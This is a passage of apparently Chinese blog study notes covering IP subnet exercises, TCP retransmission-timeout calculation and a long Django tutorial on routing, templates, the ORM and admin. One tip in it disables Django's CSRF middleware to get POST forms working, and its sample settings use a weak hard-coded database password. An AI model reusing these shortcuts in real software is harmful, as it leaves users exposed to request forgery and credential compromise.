(网络位全0) 广播地址：172.16.00111111.255→172.16.63.255 (主机位全1) 练习：写出以下IP地址的网络地址、主机地址和广播地址 172.16.99.8&#x2F;255.255.240.0 (提示：172.16.01100011.8) 192.168.3.72&#x2F;255.255.255.192 (提示：192.168.3.01001000) 10.33.4.5&#x2F;255.248.0.0 (提示：10.00100001.4.5) 192.168.56.24&#x2F;255.255.255.224 172.17.189.98&#x2F;255.255.252.0 11.254.255.220&#x2F;255.128.0.0 四、考题(记住方法) IP地址为126.150.28.57，子网掩码为255.240.0.0，那么地址类别是（），网络地址是（），直接广播地址是（），受限广播地址是（），主机地址是（），子网内的第一个可用IP地址是（），子网内的最后一个可用IP地址是（） 解答： 126.150.28.57&#x2F;255.240.0.0→126.10010110.28.57 地址类别是：A类 网络地址是：126.144.0.0 (主机位全0) 直接广播地址是：126.159.255.255 (主机位全1) 受限广播地址是：255.255.255.255 主机地址是：0.6.28.57 (网络位全0) 子网内的第一个可用IP地址是：126.144.0.1 (网络地址+1) 子网内的最后一个可用IP地址是：126.159.255.254 (广播地址-1)"},{"title":"计算机网络--重传时间计算","path":"/post/9a9f.html","text":"我们都知道，TCP发送方在规定时间内没有收到确认就要重传已发送的报文段（里面有一个超时计数器），这个逻辑很简单，但是这个超时计数器的值每次都是不一样的，也就是说：重传时间的选择是不一样的，它是如何确定的呢？？？ TCP下层是互联网环境，发送的报文段可能只经过一个高速率的局域网，也可能经过多个低速率的网络，并且每个IP数据报所选择的路由还可能不同。如果把超时重传时间设置太短，就会引起很多报文段的不必要的重传，使网络负荷增大。但若把超时重传时间设置的太长，那么网络空闲时间会增大，极大的降低了网络的效率 到底应该设置为多大呢？？？？ TCP采用了一种自适应算法，它记录一个报文段发出的时间，以及收到相应的确认的时间。这两个时间之差就是报文段的往返时间RTT。TCP保留了RTT的一个加权平均往返时间RTTs（这又成为平滑的往返时间，S表示Smoothed。因为进行的是加权平均，因此获得的结果更加平滑，也就是让我们计算出的结果更加合理）。每回的第一次测量到RTT样本时，RTTs值就取为所测量到的RTT样本值，但以后每次测量到一个新的RTT样本，就按下面的公式重新计算一次RTTs： 在上式中：（阿尔法 的值介于0到1，若很接近0，则表示旧的RTTs值和新的RTTs值相比变化不大，也就是说，新的RTT样本不太影响RTTs; 若很接近1，则表明新的RTTs值，受当前采集的RTT样本影响较大，跟上次的RTTs差距大） RFC 2988：推荐的阿尔法值为1&#x2F;8,也就是0.125 （这种方式得出的值更为平滑） 显然：超时计数器设置的超时重传时间RTO（Retransmission Time-Out）应略大于上面计算的结果。同样的： RFC 2988：建议使用下面的公式计算RTO： RTTd是RTT的偏差的加权平均值，与RTTs和新的RTT样本之差有关。RFC 2988建议这样计算RTTd。当第一次测量时，RTTd值取为RTT样本值的一半。在以后的测量中，则使用下式计算加权平均RTTd： 这里的（贝塔）是一个小于1的系数，它的推荐值是1&#x2F;4，即就是0。125 好了，通过上面这些东西：我们就可以求出超时计数器所要设置的时间问题了，但是，但是，但是，新的问题也来了？？？？ 发送一个报文段，设定的重传时间到了，还没有收到确认。于是重传报文段，经过一段时间后：收到了确认报文段。 现在的问题是：如何判定此报文段是对先发送的报文段的确认，还是对后来重传的报文段的确认？？？由于重传的报文段和原来的报文段完全一样，所以源主机在接受到确认后，无法做出正确的判断，而正确的判断对确定加权平均RTTs的值关系很大。 1，若收到的是对重传报文段的确认，但却被源主机当作是对原来报文段的确认，则计算出的RTTs和超时重传时间RTO就会偏大。若后面再发送的报文段又是经过重传后才收到的确认报文段，则RTO这个时间会越来越长。直接影响效率 2，若收到的是对原来的报文段的确认，但被当作是对重传报文段的确认，则由此计算出的RTTs和RTO都会偏小，这样就会导致过多的重传，使的RTO越来越小 根据以上所说：Karn提出了一个算法：在计算加权平均RTTs时，只要报文段重传了，就不采用其往返时间样本。这样得出的加权平均RTTs和RTO就相对比较准确了。 但是，但是，要是出现这样的情况呢？？：报文段的时延突然增大了很多。因此在原来得出的重传时间内，不会收到确认报文段。于是就重传报文段。但根据Karn算法，不考虑重传的报文段的往返时间样本。这样：超时重传时间就无法更新。 因此：要对Karn算法进行修正：方法是：报文段每重传一次，就把超时冲传时间RTO增大一些。典型的做法是：取新的重传时间为2倍的旧的重传时间。当不再发生报文段的重传时，才根据上面给出公式计算超时重传时间。。。。 转自;https://blog.csdn.net/msdnwolaile/article/details/51227491"},{"title":"后端框架学习-Django","path":"/post/9108.html","text":"基本介绍Django 是一个由 Python 编写的一个开放源代码的 Web 应用框架。 使用 Django，只要很少的代码，Python 的程序开发人员就可以轻松地完成一个正式网站所需要的大部分内容，并进一步开发出全功能的 Web 服务 Django 本身基于 MVC 模型，即 Model（模型）+ View（视图）+ Controller（控制器）设计模式，MVC 模式使后续对程序的修改和扩展简化，并且使程序某一部分的重复利用成为可能。 MVC 优势： 低耦合 开发快捷 部署方便 可重用性高 维护成本低 … Python 加 Django 是快速开发、设计、部署网站的最佳组合。 特点 强大的数据库功能 自带强大的后台功能 优雅的网址 MVC 与 MTV模型MVC 模型MVC 模式（Model–view–controller）是软件工程中的一种软件架构模式，把软件系统分为三个基本部分：模型（Model）、视图（View）和控制器（Controller）。 MVC 以一种插件式的、松耦合的方式连接在一起。 模型（M）- 编写程序应有的功能，负责业务对象与数据库的映射(ORM)。 视图（V）- 图形界面，负责与用户的交互(页面)。 控制器（C）- 负责转发请求，对请求进行处理。 简易图： 用户操作流程图： MTV 模型Django 的 MTV 模式本质上和 MVC 是一样的，也是为了各组件间保持松耦合关系，只是定义上有些许不同，Django 的 MTV 分别是指： M 表示模型（Model）：编写程序应有的功能，负责业务对象与数据库的映射(ORM)。 T 表示模板 (Template)：负责如何把页面(html)展示给用户。 V 表示视图（View）：负责业务逻辑，并在适当时候调用 Model和 Template。 除了以上三层之外，还需要一个 URL 分发器，它的作用是将一个个 URL 的页面请求分发给不同的 View 处理，View 再调用相应的 Model 和 Template，MTV 的响应模式如下所示： 简易图： 用户操作流程图： 解析： 用户通过浏览器向我们的服务器发起一个请求(request)，这个请求会去访问视图函数： a.如果不涉及到数据调用，那么这个时候视图函数直接返回一个模板也就是一个网页给用户。 b.如果涉及到数据调用，那么视图函数调用模型，模型去数据库查找数据，然后逐级返回。 视图函数把返回的数据填充到模板中空格中，最后返回网页给用户。 创建项目使用命令行创建项目django-admin startproject 项目名称 使用 Pycharm 创建项目 file ---&gt; new project ---- 选择Django ---&gt; 配置路径和项目名称 ---&gt; 配置环境(默认用系统环境) ----&gt; 点击create(完成创建) 项目目录介绍 |---mysite # 项目的&#x2F;目录 |---mysite # 项目目录 |---__init__.py |---settings.py # 配置文件 |---urls.py # 路由系统 &#x3D;&#x3D;&#x3D;&gt; url与视图的对应关系 |---wsgi.py # runserver命令就使用wsgiref模块做简单的web server |---manage.py # 管理文件 创建应用 使用命令行模式创建应用 在 Terminal 中输入 python manage.py startapp 应用名: 使用 Pycharm 创建应用 注意：使用命令行创建的应用，一定要在 settings.py–&gt;INSTALLED_APPS 中加入你的应用名字进行注册, 使用Pycharm创建的应用则不用。 认识应用结构 运行项目 使用命令行运行项目： python3 manage.py runserver manage.py runserver 80 # 指定端口 注意：要在 manage.py 同级目录执行命令。 Pycharm 启动项目 点击右上角的绿色的三角按钮。 如需更改配置信息，请下拉选择 edit configurations，进行配置。 配置完以上信息之后，直接按 Ctrl+shift+F10 运行一下 manage.py 文件。 出现如下结果，表示配置成功。 创建项目django-admin startproject + 项目名称 启动服务（测试用，前台启动）python3 manage.py runserver (+端口号&#x2F;default:8000)python3 manage.py runserver 0.0.0.0:8000 关闭服务在终端crtl+csudo lsof -i:8000 -&gt;kill -9ubuntu 启动应用python manage.py startapp 列出所有的命令python3 manage.py 生成数据库迁移文件python manage.py makemigrations 执行数据库迁移python manage.py migrate 进入 Django Shellpython manage.py shell 创建adminpython manage.py createsuperuser 清理已过期Sessionspython manage.py clearsessions 生成requirements.txt； pip freeze &gt; requirements.txt 创建内存表python manage.py createcachetable manage.py 包含项目管理的子命令项目同名文件夹init:python包的初始化文件wsgi.py:WEB网关的配置文件，正式启动django时才需要用到urls.py:项目主路由配置-HTTP请求进入Django，有限调用settings.py:项目的配置文件-包含项目启动需要的配置。 settings.py 公有配置和自定义配置 配置项格式例： BASE_DIR &#x3D; ‘xxxx’ 公有配置：Django官方提供的基础配置 自定义配置满足命名规则，并尽量个性化 项目的绝对路径 BASE_DIR &#x3D; Path(file).resolve().parent.parent 启动模式：True调试模式： 检测代码改动后，立即重启服务 报错后提供一个 False正式启动模式、上线模式 DEBUG &#x3D; True 请求Host头,只处理请求头在在列表中的请求，过滤一些请求，debug &#x3D; 1在调试模式下默认接收127.0.0.1和localhost两个值。局域网内部访问时需要把局域网IP加上，一旦不为空就必须都配置上 ALLOWED_HOSTS &#x3D; [] 主路由文件位置： ROOT_URLCONF &#x3D; ‘hworld.urls’ 语言配置： LANGUAGE_CODE &#x3D; ‘en-us’（zh-Hans） 时区： TIME_ZONE &#x3D; ‘UTC’（Asia&#x2F;Shanghai） URL统一资源定位符（Uniform Resource Locator） protocal(协议)：&#x2F;&#x2F;hostname(主机)[:port(端口)]&#x2F;path(路由)[?query(查询字符串)][#fragment(锚点)] 协议http；https（加密，安全的https）；file，本地磁盘协议（file：&#x2F;&#x2F;&#x2F;） hostname:依靠DNS解析为IP 端口：默认http为80端口 路由地址 查询字符串：？menuld&#x3D;634898&amp;version&#x3D;AID9089 主要用于给动态网页传递参数，样式：？参数&#x3D;值&amp;参数&#x3D;值 信息片段：#subject锚点，直接定位到网页指定位置 Django如何处理URL?1.从配置文件中根据ROOT_URLCONF找到主路由文件，默认urls.py2.加载urlpatterns变量[包含很多数组的路由]3.依次匹配urlspatterns的path，匹配到第一个合适的中断后续匹配4.匹配成功-返回响应5.匹配失败-返回404 视图函数用于接收浏览器请求并通过HttpResponse对象返回响应的函数。此函数可以接收浏览器请求并根据业务逻辑返回相应的响应内容给浏览器。语法： def xxx_view(request[,其他参数…])： return HttpResponse对象 书写位置：项目同名文件夹下&#x2F;views.py from django.http import HttpResponse def page1_view(request): html = '&lt;h1>这是一个页面&lt;/h1>' return HttpResponse(html) 路由配置 path函数from django.urls import pathpath(route,views,name &#x3D; None) route:字符串类型，匹配的请求路径 views：指定路径所处理的视图处理函数的名称 name：地址别名 path转化器 path转换器&lt;转换器类型:自定义名&gt;作用：若转换器类型匹配到对应类型的数据，则将数据按照关键字传参的方式传递给视图函数 path(‘page&#x2F;int:page‘,views.xxx) 转换器： str：匹配除了’&#x2F;‘之外的非空字符串 int：int匹配0或任何正整数 slug：匹配任何由ASCII字母或数字以及连字符和下划线组成的短标签 path：匹配非空字段，包括路径分隔符‘&#x2F;’ re_path函数：正则匹配，更加精密的匹配规则re_path(reg,view,name &#x3D; xx)正则表达式为命名分组模式(?Ppattern); HTTP请求1.请求：浏览器通过HTTP协议发送给服务器端的数据2.响应：服务器端接收到请求后做相应的处理后再回复给浏览器端的数据。 起始行：方法、路由、协议 headers：请求头 K:V 请求体(body)：可能为空 请求方法： GET：返回实体主体 HEAD:调试获取报头 POST：向指定资源提交数据进行处理 PUT：更新 DELETE：删除 CONNECT:代理服务器 OPTIONS TRACE：回显，主要用于测试和诊断 Django中的请求：实际就是视图函数的第一个参数，及HttpRequest对象个人理解就是Django预先将请求转变为了对象，将请求内容转变为对象属性。说到底是对报文进行了预处理。 path_info:URL字符串 method：表示HTTP请求方法 GET：拿查询字符串（？后的值），QueryDict查询字典的对象 POST：拿POST表单里的数据，即用户提交的数据，QueryDict查询字典的对象 FILES：类似于字典的对象，拿文件 COOKIES session body scheme get_full_path() META:请求头 请求&#x2F;响应起始行（协议版本 状态码） 响应头(K:V) 响应体body 响应状态码： 200 请求成功 500 内部服务器错误 301 永久重定向 302 临时重定向 404 请求的资源不存在 分类： 1**，收到请求，需要继续执行操作 2**，成功，操作被成功接收并处理 3**，重定向 4**，客户端错误 5**，服务器错误 Django的响应对象 HttpResponse(content &#x3D; 响应体，content_type &#x3D; 响应体数据类型default：html，status &#x3D; 状态码，default：200)作用：向客户端浏览器返回响应，同时携带响应体内容。 常用Content_Type ‘test&#x2F;html’ …… GET请求和POST请求统一由视图函数接收，因此一定是需要隔离业务逻辑 if request.method == 'GET': 处理GET业务逻辑 elif request.method =='POST': 处理POST的业务逻辑 else: 其他业务逻辑 ```` **GET处理：** 一般用于向服务器获取数据。 能够产生GET请求的场景： + 浏览器地址栏输入URL并回车 + &lt;a href = \"地址？参数=值&amp;参数=值\"\\> + form表单中的method为get GET请求方法中，如果有数据需要传递给服务器，通常会使用查询字符串传递。【注意不要传递敏感数据】 URL:http://127.0.0.1:8000/page1\\?a=100&amp;b=200 服务器端接收参数 获取客户端请求GET请求提交的数据： ```python request.GET['参数名'] request.GET.get('参数名','默认值') request.GET.getlist('参数名') 如果有传递多个值，则参数对应的应该是一个列表，需要使用getlist方法取出所有值，get方法只能取出最后一个值。应用场景：问卷调查的复选框 POST处理一般用于向服务器提交大量&#x2F;隐私数据通过表单 &lt;form method = 'post' action = '/login'> 姓名：&lt;input type = 'text' name = 'username'> &lt;input type = 'submit' value = '登录'> &lt;/form> CSRF验证问题本身是django的防御措施，防御CSRF攻击问题，会阻止POST，暂时关闭：settings.py》注释django.middleware.csrf.CsrfViewMiddleware Django的设计模式传统的MVC Mode-View-Controller（模型-视图-控制器）模式。特点：低耦合 M模型层：主要用于对数据库层的封装 V视图层：用于给用户展示结果（WHAT + HOW显示什么，怎么显示） C控制层：用于处理请求、获取数据、返回结果 Django：MTV模式把MVC的V拆成了两层，并且弱化C层为路由文件。 M模型层：与MVC相同 T模板层：Template，专门负责html相关事情（HOW） V视图层：核心，负责接收请求，获得结果，返回结果。 在该模式下依然存在控制层C，即主路由 Django模板层模板层创建模板：根据字典数据动态变化的html网页，根据视图中传递的字典数据动态生成相应的html页面模板配置： 创建模板文件夹 &lt;项目名&gt;&#x2F;templates 在settings.py中TEMPLATE配置项 BACKEND：指定模板引擎 DIRS：模板的搜索目录（可以是一个或多个） APP_DIRS：是否在应用中的templates文件夹中搜索末班文件 OPTIONS：有关模板的选项 主要需要修改的：DIRS： ‘DIRS’:[os.path.join(BASE_DIR,’templates’)] 模板加载方案1： from django.template import loader 1.通过loader加载模板 t = loader.get_template(\"模板文件名\") 2.将t转化为HTML字符串 html = t.render(字典数据) 3.用响应对象将转换的字符串内容返回给浏览器 return HttpResponse(html) 模板加载方案2：使用render直接加载并且响应模板。在视图函数中 from django.shortcuts import render return render(request,'模板文件名',字典数据) 视图层与模板层之间的交互 视图函数中可以将Python变量封装到字典中传递到模板中。 def xxx_view(request): dic = &#123; k1: v1, k2: v2 &#125; return render(request, 'xxx.html', dic) 模板中使用的语法来调用视图传进来的变量。 模板的变量能传递到模板中的变量类型：str,int,list,tuple,dict,func,obj 在模板中使用变量的语法： 模板层的标签作用：将一些服务器端的功能嵌入到模板中，例如流程控制等 语法 &#123;% 标签 %&#125; … &#123;% 结束标签 %&#125; 例：if标签 &#123;% if 条件表达式 1 %&#125; … &#123;% elif 条件表达式 2 %&#125; … &#123;% elif 条件表达式 3 %&#125; … &#123;% else %&#125; … &#123;% endif %&#125;#！！一定记住要封口 NOTICE!在模板中使用实际括号是无效的语法，如果需要指示优先级，则应该选择嵌套if for标签语法 &#123;% for 变量 in 可迭代对象 %&#125; …循环语句 &#123;% empty %&#125; …可迭代对象无数据时填充语句 &#123;% endfor %&#125; 内置变量forloopforloop.counter:循环的当前迭代（从1开始索引）forloop.counter0:循环的当前迭代（从0开始索引）forloop.revcounter:counter倒序forloop.revcounter0:counter0倒序forloop.first:第一次循环为真‘forloop.last：最后一次循环为真forloop.parentloop：外层循环 模板层过滤器过滤器：在变量输出时对变量的值进行处理可以通过使用过滤器来改变变量的输出显示 语法： &#123;&#123;变量|过滤器1：&#39;参数1&#39;|过滤器2：&#39;参数值2&#39;…&#125;&#125; 常用过滤器： lower：转换为小写 upper：转换为大写 safe：魔人布对变量内的字符串进行html转义 add：将value的值增加n 模板的继承模板继承使父模板内容重用，子模板直接继承父模板的全部内容并可以覆盖父模板中相应的块。 语法——父模板中： 定义父模板中的块block标签 识别出哪些在子模板是允许被修改的 block标签：在父模板中定义，在子模板中覆盖 语法——子模板中： 继承模板extends标签（写在模板第一行） 例如 &#123;%extend &#39;base.html&#39;&#125; 子模板 复写父模板中的内容块 &#123;block block_name&#125; &#123;% endblock blockname %&#125; 重写的覆盖规则 不重写，按照父模板的效果显示 重写，则按照重写效果显示 注意： 模板继承时，服务器的动态内容无法继承 url反向解析代码中url的位置：1.模板 超链接&lt;a href &#x3D; &gt; form表单 form action 将表单中的数据用POST的方法提交到url 2.视图函数中 - 302跳转 HttpResponseRedirect(‘url’)将用户地址栏中的地址跳转到url 代码中的url书写规范 1.绝对地址：http://127.0.0.1:8000/page/ 2.相对地址： a ‘&#x2F;page&#x2F;1&#x2F;‘浏览器会把当前地址栏的协议、IP和端口加上这个地址 b ‘page&#x2F;1&#x2F;‘没有&#x2F;开头的，浏览器会根据当前url最后一个&#x2F;之前的内容加上该相对地址作为最终访问地址 url反向解析指在视图或模板中，用path定义的别名来动态查找或计算出相应的路由。path： path(route,views,name&#x3D;’别名’) 模板中： &#123;% url &#39;别名&#39;%&#125; &#123;% url &#39;别名&#39; &#39;参数值1&#39; &#39;参数值2&#39;%&#125; 视图函数中调用reverse方法进行方向解析 from django.urls import reverse reverse('别名', args=[], kwargs=&#123;&#125;) ex:print(reverse(‘pagen’,args&#x3D;[300]))print(reverse(‘person’,kwargs&#x3D;{‘name’:’xixi’,’age’:18})) 静态文件什么是静态文件：图片、css、js、音频、视频静态文件属于静态请求，不经过视图函数静态文件配置-settings.py 1.静态文件的访问路径，默认’&#x2F;static&#x2F;‘ 2.STATICFILES_DIRS，静态文件在服务器端的存储位置 元组 STATICFILES_DIRS &#x3D; （ os.path.join(BASE_DIR, &quot;static&quot;), ） 3.方案2通过 &#123;% static %&#125; 标签访问静态文件 1.加载static- &#123;% load static %&#125; 2.使用静态资源- &#123;% static&#39;静态资源路径&#39; %&#125; 3.样例： &lt;img src&#x3D;&quot;&#123;% static &#39;images&#x2F;lena.jpg&#39; %&#125;&quot;&gt; 应用应用创建每一个应用都是一个MTV创建应用 用manage.py执行startapp python manage.py startapp music 在settings.py的INSTALLED_APPS列表中配置安装此应用 执行创建应用后，应用文件夹下 migrations文件夹：与DB有关 init.py admin.py apps.py models.py:与DB相关 tests.py views.py：视图函数 分布式路由Django中，主路由配置文件可以不处理用户具体路由，主路由配置文件的可以做请求的分发（分布式请求处理）。具体的请求可以由各自的应用来进行处理。主路由匹配前缀，如&#x2F;news&#x2F;，再往下分发到子路由配置。配置分布式路由： 主路由中调用include函数 http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;music&#x2F;index -&gt; path(&#39;music&#x2F;&#39;,include(&#39;music.urls&#39;)) 在子路由下创建urls.py，其内部结构与主路由完全一致。 path(‘index&#x2F;‘, views.index_view) 应用下的模板应用内部可以配置模板目录 1.应用下手动创建templates文件夹 2.settings.py中开启应用模板功能 TEMPLATE配置项中的’APP_DIRS’值为True即可、 important：查找模板的顺序：外层templates文件夹-&gt;注册顺序的app内部的templates文件夹解决方法：在应用层的templates下创建嵌套同名子目录，从而在views.py render中使得html获得不一样的路径 模型层及ORM介绍模型层：负责与数据库之间进行通信Django配置mysql 创建数据库mysql 更改settings.py： DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', 'NAME': 'mysite3', 'USER': 'root', 'PASSWORD': '123456', 'HOST': '127.0.0.1', 'POST': '3306' &#125; 什么是模型： 模型是一个Python的类，它是由django.db.models.Model派生出的子类。 一个模型类代表数据库的一张数据表 模型类中每一个类属性都代表数据库中的一个字段 模型是数据交互的接口，是表示和操作数据库的方法和方式。 ORM框架ORM（对象关系映射），是一种程序技术，能够使用类和对象对数据库进行操作，从而避免通过SQL语句操作数据库。 作用 建立模型类和表之间的对应关系，允许我们通过面向对象的方式来操作数据库。 根据设计的模型类生成数据库中的表格。 通过简单的配置就能更换数据库引擎。 优点： 只需要面向对象编程，简化了向数据库编写代码的流程。 实现了数据模型与数据库的解耦，屏蔽了不同数据库操作上的差异。 缺点： 对于复杂业务，使用成本较高 根据对象的操作转换为SQL语句，根据查询结果转化为对象，在映射过程中有性能损失。 映射图：ORM———-&gt;DB类———-&gt;数据表对象——–&gt;数据行属性——–&gt;字段 数据库迁移：迁移是Django同步您对模型所做出的更改（添加字段，删除模型等）到您的数据库模式的方式。 1.生成迁移文件： python manage.py makemigrations生成一个中间文件，并保存在migrations文件夹中 2.执行迁移脚本程序 python manage.py migrate执行迁移程序实现迁移，将每个应用下的migrations目录中的中间文件同步回数据库。 模型类模型类-创建 from django.db import models class 模型类名(models.Model): 字段名 = models.字段类型（字段选项） 表名实际为 APP名称+类名称小写 模型类-字段类型： BooleanField 数据库类型：tinyint(1) 编程语言中将使用True或False来表示值 在数据库中则使用0或1来表示具体的值 Char 数据库类型：VarChar（Django不支持Char） 注意：必须要指定max_length参数值 DataField() 数据库类型：date 作用：表示日期 参数：三选一+ auto_now:每次保存对象时，自动设置该字段为当前时间（取值：True&#x2F;False）+ auto_now_add:当兑现第一次被创建时自动设置当前时间（取值：True&#x2F;False）+ default:设置当前时间 DataTimeField() 数据库类型：datatime(6)通常用这个，比上面那个精确一些 作用：表示日期和时间 参数：同DataField FloatField() 数据库类型：double 编程语言中和数据库中都使用小数表示值 DecimalField() 数据库类型：decimal(x,y) 编程语言中:使用小数表示该列的值 在数据库中：使用小数 参数（必须有）：max_digits;decimal_places EmailField() 数据库类型：varchar 编程语言和数据库中均使用字符串，但Django含有正则检查。 IntegerField() 数据库类型：Int 编程语言和数据库中使用整数 ImageField() 数据库类型：varchar(100) 作用：在数据库中为了保存图片路径 编程语言和数据库中使用字符串 TextField() 数据库类型：longtext 作用：表示不定长的字符数据 模型类-字段选项：创建列的额外信息 primary_key：设置为True，则为主键，此数据库表不会创建id字段 blank:设置为True，则字段可以为空，控制的是Admin后台的提交，和mysql的null不同 null：设置为True，则该列允许为空 默认为False,需要一个default选项来设置默认值 default：设置该列的默认值 db_index：设置为True，表示为该列增加索引 unique: 唯一索引 db_column：指定列的名称，如果不指定的话则采用属性名作为列名。不给的话字段名就是列名。 verbose_name：设置此字段在admin界面上的显示名称，可以中文化admin界面 好习惯：字段选项【添加或更改】均要执行 模型类-Meta内部类使用Meta类来给**模型(其实就是表的属性)**赋予属性，Meta类下有很多内建的类属性，可对模型类做一些控制。如改表名： from django.db import models class 模型类名(models.Model): 字段名 = models.字段类型（字段选项） class Meta: db_table = 'book' #控制模型类在admin后台显示的名称 verbose_name = '单数名' #指定复数形态 verbose_name_plural = '复数名' Django对于数据库操作是惰性的，尽量不对数据库进行积极的修改，如设置的default值将不参与表的字段生成，只会参与实际插值。 ORM-创建数据增删改查ORM CRUD核心：模型类.管理器对象 管理器对象每一个models.Model的模型类，都会有一个objects对象被同样继承下来，这个对象叫做管理器对象。数据库的增删改查可以通过管理器实现。 创建数据方案1： MyModel.objects.create(属性1&#x3D;值1，属性2&#x3D;值2,…) 成功：返回创建好的实体对象失败：抛出异常 方案2： 创建MyModel实例对象，并调用save()并保存 obj = Mymodel(属性 = 值，属性 = 值) obj.属性 = 值 obj.save() 需要使用Django Shell python manage.py shell代码每次变化，都需要重启Django Shell ORM查询操作通过管理器对象进行通过MyModel.objects管理器方法调用查询方法方法 all() 用法：MyModel.objects.all() 等价于select * from table 返回值：QuerySet容器对象，类数组对象，内部存放了MyModel实例 如 &lt;QuerySet [&lt;Book: Python,20.00&gt;, &lt;Book: jango,50.00&gt;, &lt;Book: JQuery,40.00&gt;, &lt;Book: Linux,30.00&gt;, &lt;Book: HTML5,26.00&gt;]&gt; 可以在模型类中定义__str__方法，自定义QuerySet中的输出格式，则输出时能输出格式化字符串。 Django 同样支持方法的串联，以下方法在返回QuerySet后均可使用方法串联，且最终都会按照SQL顺序对数据库进行操作。 print(QuerySet.query)将取得实际的SQL语句。 values(‘字段1’,’字段2’) 等价于select 列1，列2 from xxx 返回：QuerySet，但内部存字典，每一个字典代表一个数据 如： &lt;QuerySet [&#123;&#39;title&#39;: &#39;HTML5&#39;&#125;, &#123;&#39;title&#39;: &#39;jango&#39;&#125;, &#123;&#39;title&#39;: &#39;JQuery&#39;&#125;, &#123;&#39;title&#39;: &#39;Linux&#39;&#125;, &#123;&#39;title&#39;: &#39;Python&#39;&#125;]&gt; values_list(‘字段1’,’字段2’) 基本同上，但返回元组，使用时需要使用索引 &lt;QuerySet [(&#39;HTML5&#39;,), (&#39;jango&#39;,), (&#39;JQuery&#39;,), (&#39;Linux&#39;,), (&#39;Python&#39;,)]&gt; order_by(‘-列’(降序),’列’) 等价于 ORDER BY 返回：QuerySet 如： &lt;QuerySet [&lt;Book: jango,50.00&gt;, &lt;Book: JQuery,40.00&gt;, &lt;Book: Linux,30.00&gt;, &lt;Book: HTML5,26.00&gt;, &lt;Book: Python,20.00&gt;]&gt; filter(条件) 语法：MyModel.objects.filter(属性1&#x3D;值1，属性2&#x3D;值2)（,默认是AND查询） 等价于 条件查询 返回值：QuerySet，存放模型实例 exclude(条件) 语法同上 等价于 WHERE NOT 作用：返回不包含此条件的全部数据集 电商取非可以用该语句 get(条件) 容易报错，一定要Try一下 语法：MyModel.objects.get（条件） 作用：返回满足条件的唯一一条数据 说明：该方法只能返回一条数据，直接获得Object 查询结果多于一条则抛出异常；查询结果没有数据则抛出Model.DoesNotExist异常。 查询谓词类属性 + ‘__’ + 谓词定义：做更灵活的条件查询时需要使用查询谓词说明：每一个查询谓词都是一个独立的查询功能 __exact:等值匹配 Author.objects.filter(id_exact&#x3D;1) &lt;&#x3D;&gt; SELECT * FROM Author WHERE ID&#x3D;1 __contains:包含指定值 Author.objects.filter(name__contains&#x3D;’w’)SELECT * FROM Author WHERE name Like ‘%w%’ __startwith:以xxx开始 __endwith:以xxx结束 __gt:大于指定值 __gte:大于等于 __lt:小于 __lte:小于等于 __in:指定范围内 Author.objects.filter(name__in&#x3D;[‘中国’，’美国’]) __range:查询数据是否在指定区间范围内 Author.objects.filter(age__range(35,50))&lt;&#x3D;&#x3D;&gt; SELECT * FROM Author WHERE age BETWEEN 35 AND 50 更新操作1.针对单个数据的修改查(get())-&gt;改：通过对象.属性的方式更改-&gt;保存：对象.save()2.批量更新数据直接调用QuerySet的update(属性&#x3D;值实现批量修改)针对QuerySet来做更改 删除操作1.单个数据删除 查找对应的数据对象 调用该数据对象的delete()方法实现删除 2.批量数据删除 查找QuerySet 调用delete()方法实现删除 3.伪删除操作通过在表里添加一个布尔型字段（is_active），默认是True；执行删除时，将欲删除数据的is_active置为False。注意：使用伪删除时，确保显示数据的地方，均添加了is_active&#x3D;True的过滤查询。 F对象F对象(很适合用于点赞)·········································**F对象实际等价于语句：UPDATE TABLE SET COLUMN&#x3D;TABLE.VALUE+10使用单句的数据库查询语句，Mysql的InnoDB引擎使用行锁，因此F对象的本质是使用了数据库中的锁。 **········································· from django.db.models import F 一个F对象代表数据库中某条记录的字段的信息(不直接取出来) 作用：通常对数据库字段值在不获取的情况下进行操作，用于类属性之间的比较 F(‘列名’) 对数据库字段值在不获取的情况下进行操作： 例：需求：将Book表中所有的market_price全部自增10。 该需求原本只能通过循环取出每一个数据后+10再写入实现。 Query的update方法必须结合F对象方法实现使用F语句 Book.objects.all().update(market_price=F('market_price')+10) 用于类属性之间的比较： Book.objects.filter(market_price_gt=F('price')+10) Q对象用于进行逻辑或、逻辑非操作时使用 Book.objects.filter(Q(market_price_lt=35)|Q(price_gt=40)) Q对象能够实现互相间的&amp;与,|或,非,&amp;与非等操作。 聚合查询聚合查询是指对一个表中的一个字段的数据进行部分或全部进行统计查询。分为整表聚合和分组聚合。 整表聚合 聚合函数需要导入 from django.db.models import * 语法： MyModel.objects.aggregate(结果变量名（别名）=聚合函数('列')) 返回：字典 分组聚合 其实是为了实现Having语句 通过计算查询结果中每一个对象所关联的对象集合，从而得出总计值，为查询集的每一项生成聚合 QuerySet.annotate(结果变量名（别名）=聚合函数('列')) 返回：QuerySet 原生数据库操作：1.只用来查询：MyoModel.objects.raw(sql语句，拼接参数) 返回值：RawQuerySet集合对象，不支持方法串联，只支持基本的循环等。 SQL注入问题：使用原生语句，使用拼接参数的方式进行查询能适当避免SQL注入问题。 2.完全跨过模型类操作数据库 导入 from django.db import connection 用创建cursor类的构造函数创建cursor(游标)对象，为保证在出现异常时能够释放cursor，通常用with来创建操作 with connection.cursor() as cur: cur.execute('执行SQL语句','拼接参数') admin后台管理admin后台用于开发过程中调用和调试，django会搜集所有已注册的模型类，并为这些模型类提供数据管理界面。 后台的创建：python manage.py createsuperuser 注册自定义模型类 在应用的admin.py导入注册要管理的models类 调用admin.site.register方法进行注册 显示样式是按照models.py中__str__方法显示的。 模型管理器类作用：为后台管理界面添加便于操作的新功能继承于django.contrib.admin里的ModelAdmin类 在应用的admin.py定义模型管理器类 class XXXXManager(admin.ModelAdmin): …… 绑定注册模型管理器和模型类,使用调用admin.site.register方法的第二个参数 类属性： class XXXXManager(admin.ModelAdmin): #表头 list_display = ['id','title','price'] #控制list_display哪些字段超链接进修改页 list_display_links = ['title'] #添加过滤器 list_filter = ['id'] #添加搜索框（模糊查询） search_fields = ['title'] #添加可在列表页可编辑的字段，与 #list_display_links字段是互斥的 list_editable = ['price'] 关系映射关系映射：一对一，一对多，多对多。 一对一映射创建一对一外键：语法：OneToOneField(类名, on_delete&#x3D;xxx(级联删除：在存在键的前提下的删除规则))on_delete: models.CASCADE：级联删除，只是模拟SQL约束ON DELETE CASCADE，不影响Mysql设置。 models.PROTECT:保护删除，等同于mysql默认的RESTRICT SET_NULL:保留关联数据，设置为NULL 